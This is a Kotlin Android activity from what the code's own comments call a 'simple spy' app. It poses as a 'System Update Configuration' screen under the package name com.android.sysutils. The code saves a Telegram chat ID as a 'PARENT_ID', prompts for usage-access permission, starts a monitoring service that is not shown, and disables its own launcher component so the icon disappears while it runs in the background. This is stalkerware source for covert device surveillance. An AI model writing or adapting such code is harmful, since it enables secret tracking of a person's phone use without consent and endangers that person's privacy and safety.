
package com.android.sysutils

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import android.content.pm.PackageManager
import android.content.ComponentName

class MainActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Setup UI dynamically (no XML layout needed for simple spy)
        val layout = android.widget.LinearLayout(this)
        layout.orientation = android.widget.LinearLayout.VERTICAL
        layout.setPadding(50, 50, 50, 50)
        
        val title = android.widget.TextView(this)
        title.text = "System Update Configuration"
        title.textSize = 24f
        layout.addView(title)
        
        val idInput = EditText(this)
        idInput.hint = "Enter Telegram Chat ID"
        layout.addView(idInput)
        
        // Load saved ID
        val prefs = getSharedPreferences("SecureSpy", Context.MODE_PRIVATE)
        idInput.setText(prefs.getString("PARENT_ID", "786455456"))
        
        val btnPerm = Button(this)
        btnPerm.text = "1. Grant Usage Access"
        btnPerm.setOnClickListener {
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
        }
        layout.addView(btnPerm)
        
        val btnStart = Button(this)
        btnStart.text = "2. Save & Start Service"
        btnStart.setOnClickListener {
            val id = idInput.text.toString()
            if (id.isEmpty()) {
                Toast.makeText(this, "ID Required", Toast.LENGTH_SHORT).show()
            } else {
                prefs.edit().putString("PARENT_ID", id).apply()
                startService(Intent(this, MonitorService::class.java))
                Toast.makeText(this, "Service Started", Toast.LENGTH_SHORT).show()
            }
        }
        layout.addView(btnStart)
        
        val btnHide = Button(this)
        btnHide.text = "3. Hide App Icon"
        btnHide.setOnClickListener {
            // Disable component to hide icon
            val p = packageManager
            val componentName = ComponentName(this, MainActivity::class.java)
            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP)
            Toast.makeText(this, "Icon Hidden. App is running in background.", Toast.LENGTH_LONG).show()
            finish()
        }
        layout.addView(btnHide)

        setContentView(layout)
    }
}
